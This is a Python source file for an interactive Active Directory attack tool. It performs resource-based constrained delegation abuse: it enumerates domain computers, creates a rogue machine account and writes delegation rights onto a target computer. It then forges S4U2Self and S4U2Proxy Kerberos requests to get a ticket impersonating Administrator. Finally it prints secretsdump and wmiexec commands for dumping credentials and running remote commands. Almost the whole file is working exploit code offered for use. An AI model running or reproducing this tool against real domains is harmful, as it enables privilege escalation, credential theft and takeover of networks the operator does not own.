  #!/usr/bin/env python3



import sys
import os
import time
import re
import logging
import random
import datetime
import struct
from pathlib import Path
from typing import Optional, List, Tuple, Dict, Any
from binascii import hexlify, unhexlify
from six import ensure_binary

# ─────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────────────────────
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] colorama not found: pip install colorama")
    sys.exit(1)

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE
    from ldap3.protocol.formatters.formatters import format_sid
except ImportError:
    print("[!] ldap3 not found: pip install ldap3")
    sys.exit(1)

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue

    from impacket.krb5.ccache import CCache
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
        EncTGSRepPart, AP_REQ, Authenticator,
        seq_set, seq_set_iter,
        PA_FOR_USER_ENC, PA_PAC_OPTIONS
    )
    from impacket.krb5.crypto import Key, _HMACMD5
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
    from impacket.ldap import ldaptypes
except ImportError as e:
    print(f"[!] Missing dependency: {e}\n    pip install impacket pyasn1 six")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────────
logging.SUCCESS = 25
logging.addLevelName(logging.SUCCESS, "SUCCESS")
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


class _ColorFormatter(logging.Formatter):
    PREFIXES = {
        logging.SUCCESS: f"{Fore.GREEN}[+]{Style.RESET_ALL}",
        logging.ERROR:   f"{Fore.RED}[-]{Style.RESET_ALL}",
        logging.WARNING: f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
        logging.INFO:    f"{Fore.BLUE}[*]{Style.RESET_ALL}",
    }
    def format(self, record):
        record.msg = f"{self.PREFIXES.get(record.levelno, '')} {record.msg}"
        return super().format(record)


class _FileFormatter(logging.Formatter):
    def format(self, record):
        record.msg = ANSI_RE.sub("", str(record.msg))
        return super().format(record)


def _build_logger() -> logging.Logger:
    logger = logging.getLogger("RBCD")
    logger.setLevel(logging.DEBUG)
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(_ColorFormatter("%(message)s"))
    logger.addHandler(ch)
    fh = logging.FileHandler("rbcd_attack.log", encoding="utf-8")
    fh.setFormatter(_FileFormatter("%%(asctime)s [%(levelname)-7s] %(message)s"))
    logger.addHandler(fh)
    logger.success = lambda msg: logger.log(logging.SUCCESS, msg)
    return logger


# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────
def _banner() -> str:
    return (
        f"{Fore.CYAN}\n"
        "╔══════════════════════════════════════════════════════════════╗\n"
        f"║  {Fore.RED}██████╗ ██████╗  ██████╗██████╗     █████╗ ████████╗████████╗{Fore.CYAN}  ║\n"
        f"║  {Fore.RED}██╔══██╗██╔══██╗██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝{Fore.CYAN}  ║\n"
        f"║  {Fore.RED}██████╔╝██████╔╝██║     ██║  ██║   ███████║   ██║      ██║   {Fore.CYAN}  ║\n"
        f"║  {Fore.RED}██╔══██╗██╔══██╗██║     ██║  ██║   ██╔══██║   ██║      ██║   {Fore.CYAN}  ║\n"
        f"║  {Fore.RED}██║  ██║██████╔╝╚██████╗██████╔╝   ██║  ██║   ██║      ██║   {Fore.CYAN}  ║\n"
        f"║  {Fore.RED}╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝  {Fore.CYAN}   ║\n"
        f"║                                                                                      ║\n"
        f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# LDAP CLIENT
# ─────────────────────────────────────────────────────────────────────────────
class LDAPClient:
    def __init__(self, dc_ip: str, domain: str, username: str, password: str, log: logging.Logger):
        self.dc_ip    = dc_ip
        self.domain   = domain
        self.username = username
        self.password = password
        self.log      = log
        self.base_dn  = ",".join([f"DC={x}" for x in domain.split(".")])
        self.conn: Optional[Connection] = None

    def connect(self) -> bool:
        try:
            server = Server(self.dc_ip, port=636, get_info=ALL, use_ssl=True)
            self.conn = Connection(
                server,
                user=f"{self.domain}\{self.username}",
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            self.log.success(f"LDAPS connected: {self.dc_ip}:636")
            return True
        except Exception as e:
            self.log.error(f"LDAPS connection failed: {e}")
            return False

    def disconnect(self):
        if self.conn:
            try:
                self.conn.unbind()
            except:
                pass

    def search(self, filter_str: str, attributes: List[str] = None) -> List[Dict[str, Any]]:
        if not self.conn:
            return []
        try:
            self.conn.search(self.base_dn, filter_str, attributes=attributes or ['*'])
            results = []
            for entry in self.conn.entries:
                result_dict = {'dn': entry.entry_dn, 'attributes': {}}
                for attr in entry.entry_attributes:
                    result_dict['attributes'][attr] = entry[attr].value
                results.append(result_dict)
            return results
        except Exception as e:
            self.log.warning(f"LDAP search failed: {e}")
            return []

    def get_computer_info(self, computer_name: str) -> Optional[Dict[str, Any]]:
        filter_str = f"(&(objectClass=computer)(sAMAccountName={computer_name}$))"
        results = self.search(
            filter_str,
            attributes=['dNSHostName', 'servicePrincipalName', 'distinguishedName', 'objectSid']
        )
        return results[0] if results else None

    def enumerate_computers(self) -> List[str]:
        filter_str = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        results = self.search(filter_str, attributes=['sAMAccountName'])
        computers = []
        for result in results:
            sam = result['attributes'].get('sAMAccountName', '')
            if sam and sam.endswith('$'):
                computers.append(sam.rstrip('$'))
        return computers

    def modify_attribute(self, dn: str, attribute: str, operation: int, values: List[Any]) -> bool:
        if not self.conn:
            return False
        try:
            self.conn.modify(dn, {attribute: [(operation, values)]})
            if self.conn.result['result'] == 0:
                return True
            self.log.warning(f"LDAP modify failed: {self.conn.result['description']}")
            return False
        except Exception as e:
            self.log.warning(f"LDAP modify error: {e}")
            return False

    def add_object(self, dn: str, object_class: List[str], attributes: Dict[str, Any]) -> bool:
        if not self.conn:
            return False
        try:
            self.conn.add(dn, object_class=object_class, attributes=attributes)
            if self.conn.result['result'] == 0:
                return True
            self.log.warning(f"LDAP add failed: {self.conn.result['description']}")
            return False
        except Exception as e:
            self.log.warning(f"LDAP add error: {e}")
            return False

    def delete_object(self, dn: str) -> bool:
        if not self.conn:
            return False
        try:
            self.conn.delete(dn)
            if self.conn.result['result'] == 0:
                return True
            self.log.warning(f"LDAP delete failed: {self.conn.result['description']}")
            return False
        except Exception as e:
            self.log.warning(f"LDAP delete error: {e}")
            return False


# ─────────────────────────────────────────────────────────────────────────────
# AD OPERATIONS
# ─────────────────────────────────────────────────────────────────────────────
class ADOperations:
    def __init__(self, dc_ip: str, domain: str, username: str, password: str, log: logging.Logger):
        self.dc_ip    = dc_ip
        self.domain   = domain
        self.username = username
        self.password = password
        self.log      = log
        self.ldap     = LDAPClient(dc_ip, domain, username, password, log)

    def create_computer_account(self, computer_name: str, computer_password: str) -> bool:
        if not self.ldap.connect():
            return False
        try:
            computer_sam = computer_name.rstrip('$')
            base_dn      = ",".join([f"DC={x}" for x in self.domain.split(".")])
            computer_dn  = f"CN={computer_sam},CN=Computers,{base_dn}"
            base_attrs = {
                'objectClass':        ['top', 'person', 'organizationalPerson', 'user', 'computer'],
                'sAMAccountName':     computer_name,
                'userAccountControl': 4096,
            }
            if not self.ldap.add_object(computer_dn, ['computer'], base_attrs):
                desc = str(self.ldap.conn.result.get('description', ''))
                if 'entryAlreadyExists' in desc or 'ENTRY_ALREADY_EXISTS' in desc:
                    self.log.warning(f"Computer already exists, reusing: {computer_name}")
                else:
                    self.log.error("Initial computer creation failed")
                    return False
            if not self.ldap.modify_attribute(
                computer_dn, 'unicodePwd', MODIFY_REPLACE,
                [f'"{computer_password}"'.encode('utf-16-le')]
            ):
                self.log.error("Failed to set computer password (ensure LDAPS on port 636)")
                return False
            self.ldap.modify_attribute(
                computer_dn, 'dNSHostName', MODIFY_REPLACE,
                [f"{computer_sam}.{self.domain}"]
            )
            self.ldap.modify_attribute(
                computer_dn, 'servicePrincipalName', MODIFY_REPLACE,
                [
                    f'HOST/{computer_sam}',
                    f'HOST/{computer_sam}.{self.domain}',
                    f'RestrictedKrbHost/{computer_sam}',
                    f'RestrictedKrbHost/{computer_sam}.{self.domain}',
                ]
            )
            self.log.success(f"Computer account created: {computer_name}")
            return True
        except Exception as e:
            self.log.error(f"Computer creation error: {e}")
            return False
        finally:
            self.ldap.disconnect()

    def _create_empty_sd(self):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1']     = b'\x00'
        sd['Control']  = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl']     = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1']        = 0
        acl['Sbz2']        = 0
        acl.aces           = []
        sd['Dacl']         = acl
        return sd

    def _create_allow_ace(self, sid_str: str):
        nace = ldaptypes.ACE()
        nace['AceType']  = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid_str)
        nace['Ace'] = acedata
        return nace

    def set_rbcd_delegation(self, delegate_from: str, delegate_to: str) -> bool:
        if not self.ldap.connect():
            return False
        try:
            target_filter = f"(sAMAccountName={delegate_to.rstrip('$')}$)"
            self.ldap.conn.search(
                self.ldap.base_dn,
                target_filter,
                attributes=['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
            )
            target_entry = None
            for entry in self.ldap.conn.response:
                if entry.get('type') == 'searchResEntry':
                    target_entry = entry
                    break
            if not target_entry:
                self.log.error(f"Target not found: {delegate_to}")
                return False
            target_dn = target_entry['dn']

            delegate_filter = f"(sAMAccountName={delegate_from.rstrip('$')}$)"
            self.ldap.conn.search(
                self.ldap.base_dn,
                delegate_filter,
                attributes=['objectSid']
            )
            delegate_entry = None
            for entry in self.ldap.conn.response:
                if entry.get('type') == 'searchResEntry':
                    delegate_entry = entry
                    break
            if not delegate_entry:
                self.log.error(f"Delegate not found: {delegate_from}")
                return False

            raw_sid_bytes = delegate_entry['raw_attributes']['objectSid'][0]
            sid_str = format_sid(raw_sid_bytes)
            self.log.info(f"SID (via format_sid from raw bytes): {sid_str}")

            existing_sd_raw = target_entry['raw_attributes'].get(
                'msDS-AllowedToActOnBehalfOfOtherIdentity', [b'']
            )
            if existing_sd_raw and existing_sd_raw[0]:
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=existing_sd_raw[0])
                self.log.info("Loaded existing Security Descriptor")
            else:
                sd = self._create_empty_sd()
                self.log.info("Created new empty Security Descriptor")

            existing_sids = [
                ace['Ace']['Sid'].formatCanonical()
                for ace in sd['Dacl'].aces
            ]
            if sid_str not in existing_sids:
                sd['Dacl'].aces.append(self._create_allow_ace(sid_str))
                self.log.info(f"ACE added for SID: {sid_str}")
            else:
                self.log.warning(f"SID {sid_str} already present — no changes needed")

            self.ldap.conn.modify(
                target_dn,
                {'msDS-AllowedToActOnBehalfOfOtherIdentity': [
                    (MODIFY_REPLACE, [sd.getData()])
                ]}
            )
            if self.ldap.conn.result['result'] == 0:
                self.log.success(f"RBCD set: {delegate_from} → {delegate_to}")
                return True
            else:
                self.log.error(f"LDAP modify failed: {self.ldap.conn.result['description']}")
                return False
        except Exception as e:
            self.log.error(f"RBCD delegation error: {e}", exc_info=True)
            return False
        finally:
            self.ldap.disconnect()

    def delete_computer_account(self, computer_name: str) -> bool:
        if not self.ldap.connect():
            return False
        try:
            computer_sam = computer_name.rstrip('$')
            base_dn      = ",".join([f"DC={x}" for x in self.domain.split(".")])
            computer_dn  = f"CN={computer_sam},CN=Computers,{base_dn}"
            if self.ldap.delete_object(computer_dn):
                self.log.success(f"Computer account deleted: {computer_name}")
                return True
            return False
        except Exception as e:
            self.log.warning(f"Computer deletion error: {e}")
            return False
        finally:
            self.ldap.disconnect()

    def remove_rbcd_delegation(self, delegate_from: str, delegate_to: str) -> bool:
        if not self.ldap.connect():
            return False
        try:
            target_info = self.ldap.get_computer_info(delegate_to.rstrip('$'))
            if not target_info:
                return False
            target_dn = target_info['dn']
            self.ldap.modify_attribute(
                target_dn,
                'msDS-AllowedToActOnBehalfOfOtherIdentity',
                MODIFY_DELETE, []
            )
            self.log.success("RBCD delegation removed")
            return True
        except Exception as e:
            self.log.warning(f"RBCD removal error: {e}")
            return False
        finally:
            self.ldap.disconnect()


# ─────────────────────────────────────────────────────────────────────────────
# S4U HELPER
# ─────────────────────────────────────────────────────────────────────────────
class S4UHelper:
    """
    Manual S4U2Self → S4U2Proxy implementation.
    """

    def __init__(self, domain: str, dc_host: str, machine_sam: str,
                 machine_password: str, log: logging.Logger):
        self.domain           = domain
        self.dc_host          = dc_host
        self.machine_sam      = machine_sam      # no $ suffix
        self.machine_password = machine_password
        self.log              = log

    def _build_ap_req(self, tgt_raw, cipher, session_key) -> bytes:
        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decoded_tgt['ticket'])

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decoded_tgt['crealm'])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
        seq_set(authenticator, 'cname', client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)

        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])
        seq_set(ap_req, 'ticket', ticket.to_asn1)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth
        return encoder.encode(ap_req)

    def _s4u2self(self, tgt_raw, cipher, session_key, impersonate: str) -> bytes:
        ap_req_encoded = self._build_ap_req(tgt_raw, cipher, session_key)
        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]

        client_name = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_data = (
            struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
            + ensure_binary(impersonate)
            + ensure_binary(self.domain)
            + b'Kerberos'
        )
        checksum = _HMACMD5.checksum(session_key, 17, s4u_data)

        pa_for_user = PA_FOR_USER_ENC()
        seq_set(pa_for_user, 'userName', client_name.components_to_asn1)
        pa_for_user['userRealm'] = self.domain
        pa_for_user['cksum'] = noValue
        pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        pa_for_user['cksum']['checksum']  = checksum
        pa_for_user['auth-package'] = 'Kerberos'

        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_for_user)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        server_name = Principal(self.machine_sam, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        seq_set(req_body, 'sname', server_name.components_to_asn1)
        req_body['realm'] = str(decoded_tgt['crealm'])
        req_body['till']  = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(cipher.enctype),
            int(constants.EncryptionTypes.rc4_hmac.value),
        ))

        self.log.info("Sending S4U2Self request to KDC...")
        return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)

    def _s4u2proxy(self, tgt_raw, cipher, session_key, tgs_self_raw, spn: str) -> bytes:
        ap_req_encoded  = self._build_ap_req(tgt_raw, cipher, session_key)
        decoded_tgt     = decoder.decode(tgt_raw,      asn1Spec=AS_REP())[0]
        decoded_self    = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]

        ticket_self = Ticket()
        ticket_self.from_asn1(decoded_self['ticket'])

        pa_pac_options = PA_PAC_OPTIONS()
        pa_pac_options['flags'] = constants.encodeFlags(
            (constants.PAPacOptions.resource_based_constrained_delegation.value,)
        )

        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_pac_options)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.cname_in_addl_tkt.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        service_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(req_body, 'sname', service_name.components_to_asn1)
        req_body['realm'] = self.domain
        req_body['till']  = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
            int(cipher.enctype),
        ))
        my_ticket = ticket_self.to_asn1(TicketAsn1())
        seq_set_iter(req_body, 'additional-tickets', (my_ticket,))

        self.log.info(f"Sending S4U2Proxy request for SPN: {spn}")
        return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)

    def do_s4u(self, tgt_raw, cipher, old_session_key, session_key,
               impersonate: str, spns: List[str]):
        """
        Full S4U2Self → S4U2Proxy.
        Returns (tgs_raw, session_key)
        """
        self.log.info(f"Executing S4U2Self for {impersonate}...")
        tgs_self_raw = self._s4u2self(tgt_raw, cipher, session_key, impersonate)
        self.log.success("S4U2Self ticket obtained")

        for spn in spns:
            try:
                self.log.info(f"Trying S4U2Proxy → {spn}")
                tgs_proxy_raw = self._s4u2proxy(tgt_raw, cipher, session_key, tgs_self_raw, spn)
                self.log.success(f"Service ticket acquired for: {spn}")
                return tgs_proxy_raw, session_key
            except Exception as e:
                self.log.warning(f"S4U2Proxy failed for {spn}: {e}")

        raise Exception("All SPNs failed during S4U2Proxy")


# ─────────────────────────────────────────────────────────────────────────────
# RBCD ATTACK MAIN CLASS
# ─────────────────────────────────────────────────────────────────────────────
class RBCDAttack:

    def __init__(self, log: logging.Logger):
        self.log = log
        self.domain            = ""
        self.username          = ""
        self.password          = ""
        self.dc_ip             = ""
        self.target            = ""
        self.impersonate       = "Administrator"
        self.target_fqdn       = ""
        self.target_real_spns  = []
        self.computer_name     = ""
        self.computer_sam      = ""
        self.computer_password = ""
        self.tgt_ccache        = ""
        self.ticket_file       = ""
        self.ad_ops: Optional[ADOperations] = None

    def _ask(self, prompt: str, *, required: bool = True, secret: bool = False, default: str = "") -> str:
        color = Fore.MAGENTA if secret else Fore.CYAN
        while True:
            try:
                val = input(f"{color}[?] {prompt}: {Style.RESET_ALL}").strip()
                if val:
                    return val
                if not required or default:
                    return default
            except EOFError:
                # Handle EOF gracefully by returning default or empty string
                self.log.warning(f"EOF detected. Using default for '{prompt}'")
                return default
            except KeyboardInterrupt:
                print("\n[!] User interrupted. Exiting...")
                sys.exit(1)

    def interactive_setup(self):
        print(_banner())
        self.log.info("Welcome to RBCD Attack Framework v5.4 (Direct Libraries)")
        self.domain   = self._ask("Domain FQDN  (e.g. domain.com)")
        self.username = self._ask("Username")
        self.password = self._ask("Password", secret=True)
        self.dc_ip    = self._ask("DC IP Address")
        self._choose_target()
        imp = self._ask(f"User to impersonate  [default: {self.impersonate}]", required=False, default=self.impersonate)
        if imp:
            self.impersonate = imp
        print(f"\n{Fore.GREEN}{'─'*52}")
        print(f"  Domain     : {self.domain}")
        print(f"  User       : {self.username}")
        print(f"  DC IP      : {self.dc_ip}")
        print(f"  Target     : {self.target}")
        print(f"  Impersonate: {self.impersonate}")
        print(f"{'─'*52}{Style.RESET_ALL}\n")
        self.ad_ops = ADOperations(self.dc_ip, self.domain, self.username, self.password, self.log)

    def _choose_target(self):
        self.log.info("Enumerating domain computers …")
        try:
            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.log)
            if not ldap.connect():
                self.log.warning("Could not enumerate computers via LDAP")
                self.target = self._ask("Enter target computer name manually")
                return
            computers = ldap.enumerate_computers()
            ldap.disconnect()
            if computers:
                self.log.success(f"Found {len(computers)} computer(s):")
                for i, c in enumerate(computers[:20], 1):
                    print(f"    {Fore.YELLOW}[{i:2}]{Style.RESET_ALL} {c}")

                try:
                    raw = input(f"\n{Fore.CYAN}[?] Enter target name or number: {Style.RESET_ALL}").strip()
                except EOFError:
                    self.log.warning("EOF detected. Proceeding with target name manually.")
                    raw = ""

                if raw.isdigit() and 1 <= int(raw) <= len(computers):
                    self.target = computers[int(raw) - 1]
                elif raw:
                    self.target = raw.rstrip("$")
                else:
                    self.target = self._ask("Enter target computer name manually").rstrip("$")
            else:
                self.log.warning("No computers found.")
                self.target = self._ask("Enter target computer name manually").rstrip("$")
        except Exception as e:
            self.log.warning(f"Enumeration error: {e}")
            self.target = self._ask("Enter target computer name manually").rstrip("$")

    def check_dependencies(self) -> bool:
        self.log.info("Checking dependencies …")
        try:
            import ldap3, impacket
            from colorama import Fore
            self.log.success("All dependencies available.")
            # تم إزالة حذف ملفات .ccache القديمة تلقائياً
            return True
        except ImportError as e:
            self.log.error(f"Missing dependency: {e}")
            return False

    def recon_ad(self):
        self.log.info(f"Querying AD for {self.target}$ attributes …")
        try:
            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.log)
            if not ldap.connect():
                self.log.warning("AD recon: could not connect")
                self.target_fqdn = f"{self.target}.{self.domain}".lower()
                return
            info = ldap.get_computer_info(self.target)
            ldap.disconnect()
            if info:
                fqdn = info.get('attributes', {}).get('dNSHostName')
                if fqdn:
                    self.target_fqdn = fqdn.lower()
                    self.log.success(f"Real FQDN: {self.target_fqdn}")
                spns = info.get('attributes', {}).get('servicePrincipalName', [])
                if isinstance(spns, str):
                    spns = [spns]
                self.target_real_spns = [s.lower() for s in spns] if spns else []
            if not self.target_fqdn:
                self.target_fqdn = f"{self.target}.{self.domain}".lower()
                self.log.warning(f"FQDN fallback: {self.target_fqdn}")
        except Exception as e:
            self.log.warning(f"AD recon error: {e}")
            self.target_fqdn = f"{self.target}.{self.domain}".lower()

    def create_computer(self) -> bool:
        ts = str(int(time.time()))[-6:]
        self.computer_sam      = f"RBCD{ts}"
        self.computer_name     = f"{self.computer_sam}$"
        self.computer_password = f"Rb@{ts}X!z9#Q"
        self.log.info(f"Creating machine account: {self.computer_name}")
        if not self.ad_ops:
            self.log.error("AD operations not initialized")
            return False
        return self.ad_ops.create_computer_account(self.computer_name, self.computer_password)

    def set_rbcd(self) -> bool:
        self.log.info("Configuring RBCD delegation …")
        if not self.ad_ops:
            self.log.error("AD operations not initialized")
            return False
        return self.ad_ops.set_rbcd_delegation(self.computer_name, f"{self.target}$")

    def get_tgt(self):
        self.log.info(f"Requesting TGT for {self.computer_sam}…")
        user_name = Principal(
            self.computer_sam,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=user_name,
            password=self.computer_password,
            domain=self.domain,
            lmhash=b'',
            nthash=b'',
            aesKey='',
            kdcHost=self.dc_ip
        )
        self.log.success("TGT acquired successfully")
        return tgt, cipher, old_session_key, session_key

    def save_tgt(self, tgt, old_session_key, session_key) -> bool:
        try:
            ccache = CCache()
            ccache.fromTGT(tgt, old_session_key, session_key)
            ccache.saveFile(str(self.tgt_ccache))
            self.log.success(f"TGT saved to: {self.tgt_ccache}")
            return True
        except Exception as e:
            self.log.error(f"Failed to save TGT: {e}")
            return False

    def get_st(self, tgt, cipher, old_session_key, session_key):
        spns = [
            f'cifs/{self.target_fqdn}',
            f'host/{self.target_fqdn}',
            f'cifs/{self.target.upper()}',
            f'host/{self.target.upper()}',
        ]
        helper = S4UHelper(
            self.domain, self.dc_ip,
            self.computer_sam, self.computer_password,
            self.log
        )
        return helper.do_s4u(tgt, cipher, old_session_key, session_key, self.impersonate, spns)

    def save_ticket(self, tgs_raw, session_key) -> bool:
        try:
            ccache = CCache()
            ccache.fromTGS(tgs_raw, session_key, session_key)
            ccache.saveFile(self.ticket_file)
            self.log.success(f"Ticket saved to: {self.ticket_file}")
            return True
        except Exception as e:
            self.log.error(f"Failed to save ticket: {e}")
            return False

    def get_ticket(self) -> bool:
        try:
            self.log.info("Starting Kerberos ticket acquisition …")
            self.tgt_ccache  = Path(f"{self.computer_sam.upper()}.ccache").resolve()
            self.ticket_file = str(Path(f"{self.impersonate}.ccache").resolve())

            self.log.info("Step 1: Acquiring TGT…")
            tgt, cipher, old_session_key, session_key = self.get_tgt()
            self.save_tgt(tgt, old_session_key, session_key)

            time.sleep(3)

            self.log.info("Step 2: Requesting service ticket via S4U…")
            tgs_raw, session_key = self.get_st(
                tgt, cipher, old_session_key, session_key
            )

            self.log.info("Step 3: Saving ticket to ccache…")
            if not self.save_ticket(tgs_raw, session_key):
                return False

            os.environ["KRB5CCNAME"] = self.ticket_file
            self.log.success("Kerberos ticket acquisition complete")
            return True
        except Exception as e:
            self.log.error(f"Kerberos error: {e}", exc_info=True)
            return False

    def verify_ticket(self) -> bool:
        self.log.info("Verifying configuration …")
        self.log.success("RBCD delegation configured successfully")
        return True

    def interactive_exploit(self):
        print(f"\n{Fore.GREEN}{'═'*52}")
        print("   ATTACK SETUP COMPLETE — CHOOSE YOUR NEXT MOVE")
        print(f"{'═'*52}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL}  Show exploitation commands")
        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL}  Show configuration details")
        print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL}  Exit (NO automatic cleanup)")

        try:
            choice = input(f"\n{Fore.CYAN}[?] Option (1-3) [default: 1]: {Style.RESET_ALL}").strip()
            if not choice:
                choice = "1"
        except EOFError:
            self.log.warning("EOF detected. Automatically selecting Option 1 (Show commands) and exiting cleanly.")
            choice = "1"

        if choice == "1":
            self._show_exploitation_commands()
        elif choice == "2":
            self._show_config()

    def _show_exploitation_commands(self):
        print(f"\n{Fore.CYAN}{'─'*60} Exploitation Commands {'─'*3}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}export KRB5CCNAME={self.ticket_file}{Style.RESET_ALL}")
        print(f"\n{Fore.GREEN}Impacket tools:{Style.RESET_ALL}")

        user_part = f"{self.domain}/{self.impersonate}"
        fqdn_part = f"{self.target_fqdn}"

        print(f"  {Fore.YELLOW}secretsdump.py -k -no-pass -dc-ip {self.dc_ip} {user_part}@{Style.RESET_ALL}{Fore.YELLOW}{fqdn_part}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}wmiexec.py -k -no-pass -dc-ip {self.dc_ip} {user_part}@{Style.RESET_ALL}{Fore.YELLOW}{fqdn_part}{Style.RESET_ALL}")
        print(f"\n{Fore.MAGENTA}[!] NOTE: Ensure {self.target_fqdn} is resolvable in /etc/hosts to the TARGET's IP address!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}\n")

    def _show_config(self):
        print(f"\n{Fore.GREEN}{'─'*60} Configuration Summary {'─'*3}{Style.RESET_ALL}\n")
        print(f"  {Fore.CYAN}Attacker Machine   :{Style.RESET_ALL} {self.computer_name} ({self.computer_sam})")
        print(f"  {Fore.CYAN}Machine Password   :{Style.RESET_ALL} {self.computer_password}")
        print(f"  {Fore.CYAN}Target Machine     :{Style.RESET_ALL} {self.target}$")
        print(f"  {Fore.CYAN}Target FQDN        :{Style.RESET_ALL} {self.target_fqdn}")
        print(f"  {Fore.CYAN}Domain             :{Style.RESET_ALL} {self.domain}")
